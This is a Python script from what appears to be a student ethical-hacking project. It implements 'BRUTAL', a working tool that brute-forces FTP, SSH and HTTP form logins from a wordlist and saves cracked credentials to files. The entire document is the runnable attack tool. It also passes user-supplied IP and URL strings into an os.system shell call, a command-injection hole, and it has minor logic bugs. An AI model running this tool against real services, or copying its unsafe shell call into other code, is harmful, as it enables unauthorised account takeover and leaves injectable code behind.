'''
ETHICAL HACKING AND CYBER LAWS MINI PROJECT (2021-2022)

PROJECT TOPIC: BRUTE FORCING LOGIN SERVICES

GROUP MEMBERS:
JOEL ELDOE
OMKAR JAGTAP
VISHAL SARODE
SAHIL KOHINKAR
'''

import ftplib           # Module to implement FTP login
import pexpect
import requests         # Module to send HTTP requests
import os, sys, time    # Modules which support other small functionalities in the project

# ANSI codes for font colors
class colors:
    GREEN = '\033[92m'  # GREEN COLOR
    YELLOW = '\033[93m' # YELLOW COLOR
    RED = '\033[91m'    # RED COLOR
    RESET = '\033[0m'   # RESET COLOR

# Function to implement brute-force attack on the FTP server
def ftpBruteForce(IP, wordlist):
    # List to store the correct credentials
    credentials = []
    
    # Check anonymous login
    try:
        ftp = ftplib.FTP(IP)
        ftp.login('anonymous','')
        print(f"[{colors.GREEN}+{colors.RESET}] Anonymous login found on {IP}!\n")
        credentials.append("anonymous:''")
        ftp.quit()
    except Exception as e:
        if('service not known' in e):
            print(f"[{colors.RED}-{colors.RESET}] This host probably seems to be down or doesn't exist!")
            exit()
        else:
            print(f"[{colors.RED}-{colors.RESET}] Anonymous login not allowed on {IP}!\n")

    # Starting brute-force attack
    dictionary = []
    f = open(wordlist, 'r')
    dictionary = f.readlines()
    f.close()

    for user in dictionary:
        user = user.strip('\n')
        for passwd in dictionary:
            passwd = passwd.strip('\n')
            try:
                ftp = ftplib.FTP(IP, timeout=0.1)
                ftp.login(user,passwd)
                print(f"\n[{colors.GREEN}+{colors.RESET}] Login successful using {user}:{passwd}\n")
                credentials.append(user+":"+passwd)
                ftp.quit()
            except Exception as e:
                print(f"[{colors.RED}-{colors.RESET}] Login failed using {user}:{passwd}")

    # Checking whether we got some credentials or not
    if(len(credentials) != 0):
        print(f"\n[{colors.GREEN}+{colors.RESET}] {len(credentials)} user accounts cracked!\n")
        filename = f"{IP}-FTP-cracked.txt"
        os.system(f'touch {filename}')
        f = open(filename, 'w')
        for creds in credentials:
            f.write(creds+"\n")
        f.close()
        print(f"[{colors.GREEN}+{colors.RESET}] Saving results in '{colors.YELLOW}{filename}{colors.RESET}'...\n")
        time.sleep(1)
    else:
        print(f"\n[{colors.RED}-{colors.RESET}] No credentials found in this list!\n")

# Function to implement brute-force attack on the SSH server
def sshBruteForce(IP, user, passwd):
    prompt = ['# ', '>>> ', '> ', '\$ ']

    ssh_newkey = "Are you sure you want to continue connecting"
    ssh_command = 'ssh '+ user + '@' + IP
    
    # Executing the SSH command using spawn function, which will return the spawned process
    child_process = pexpect.spawn(ssh_command)

    # Trying to match the expected response
    response = child_process.expect([pexpect.TIMEOUT, ssh_newkey,'[P|p]assword: '])
    if(response == 0):
        print(f"[-] Error connecting!")
        return
    if(response == 1):
        # Sending response for adding host key
        child_process.sendline('yes')
        response = child_process.expect([pexpect.TIMEOUT, '[P|p]assword: '])
        if(response == 0):
            print(f"[-] Error connecting!")
            return
            
    # Sending the password
    child_process.sendline(passwd)
    child_process.expect(prompt, timeout=0.05)
    return child_process
    
# Function to implement brute-force attack on the web server
def httpBruteForce(url, username, wordlist):
    f = open(wordlist, 'r')
    for word in f.readlines():
        word = word.strip('\n')

        # Data which will be sent with the HTTP request
        data = {
            "username":username,
            "password":word,
            "Login":"Login"
        }

        # Sending an HTTP POST request
        r = requests.post(url, data=data)

        # Checking the HTTP response
        if 'Welcome' in r.text:
            print(f"\n[{colors.GREEN}+{colors.RESET}] Login successful using {username}:{word}\n")
            
            # Saving the cracked credentials in a file
            filename = f"{url.split('/')[2]}-HTTP-cracked.txt"
            os.system(f'touch {filename}')
            f = open(filename, 'w')
            f.write(f"{username}:{word}\n")
            f.close()
            print(f"[{colors.GREEN}+{colors.RESET}] Saving results in '{colors.YELLOW}{filename}{colors.RESET}'...\n")
            time.sleep(1)
            break
        else:
            print(f"[{colors.RED}-{colors.RESET}] Login failed using {username}:{word}")

def banner():
    print(f"="*50)
    print("\n"+" "*10+f"{colors.YELLOW}BRUTAL: A brute forcing tool{colors.RESET}\n")
    print(f"="*50+"\n")

def main():
    banner()
    usage = f"{colors.YELLOW}Usage: python3 brutal.py <wordlist> <ftp or ssh or http>{colors.RESET}"

    # Checking the existence of the wordlist file
    try:
        wordlist = sys.argv[1]
        try:
            f = open(wordlist, 'r')
            f.close()
        except OSError as e:
            print(f"[{colors.RED}-{colors.RESET}] {e}")
            print(usage)
            exit()
            
        # Determining the target service
        services = ['ftp','ssh','http']
        service = sys.argv[2]
        if service in services:
            if(service == 'ftp'):
                target = input("Enter the target IP address: ")
                checker = target.split('.')
                if(len(checker) == 4):
                    print(f"Target locked: {colors.YELLOW}{target}{colors.RESET}\n")
                    print("Initiating attack on FTP server...\n")
                    time.sleep(3)
                    ftpBruteForce(target, wordlist)
                else:
                    print(f"[{colors.RED}-{colors.RESET}] Invalid IP address!")

            elif(service == 'ssh'):
                target = input("Enter the target IP address: ")
                checker = target.split('.')
                if(len(checker) == 4):
                    #user = input("Enter the username: ")
                    print(f"Target locked: {colors.YELLOW}{target}{colors.RESET}\n")
                    print("Initiating attack on SSH server...\n")
                    time.sleep(3)

                    dictionary = []
                    f = open(wordlist, 'r')
                    dictionary = f.readlines()
                    f.close()
                    credentials = []
                    for user in dictionary:
                        user = user.strip('\n')
                        for passwd in dictionary:
                            passwd = passwd.strip('\n')
                            try:
                                child_process = sshBruteForce(target, user, passwd)
                                print(f"\n[{colors.GREEN}+{colors.RESET}] Login successful using {user}:{passwd}\n")
                                credentials.append(f"{user}:{passwd}")    
                            except Exception as e:
                                print(f"[{colors.RED}-{colors.RESET}] Login failed using {user}:{passwd}")

                    # Checking whether we got some credentials or not
                    if(len(credentials) != 0):
                        print(f"\n[{colors.GREEN}+{colors.RESET}] {len(credentials)} user accounts cracked!\n")
                        filename = f"{target}-SSH-cracked.txt"
                        os.system(f'touch {filename}')
                        f = open(filename, 'w')
                        for creds in credentials:
                            f.write(creds+"\n")
                        f.close()
                        print(f"[{colors.GREEN}+{colors.RESET}] Saving results in '{colors.YELLOW}{filename}{colors.RESET}'...\n")
                        time.sleep(1)
                    else:
                        print(f"\n[{colors.RED}-{colors.RESET}] No credentials found in this list!\n")

                else:
                    print(f"[{colors.RED}-{colors.RESET}] Invalid IP address!")

            elif(service == 'http'):
                url = input("Enter the target URL: ")
                if(('http://' or 'https://') in url):
                    username = input("Enter the username: ")
                    print(f"Target locked: {colors.YELLOW}{url}{colors.RESET}\n")
                    print("Initiating attack on HTTP server...\n")
                    time.sleep(3)
                    httpBruteForce(url, username, wordlist)
                else:
                    print(f"[{colors.RED}-{colors.RESET}] Invalid URL!")
        
        else:
            print(f"[{colors.RED}-{colors.RESET}] Attack only possible on ftp, ssh and http services")
            print(usage)
    
    except Exception as e:
        print(usage)

main()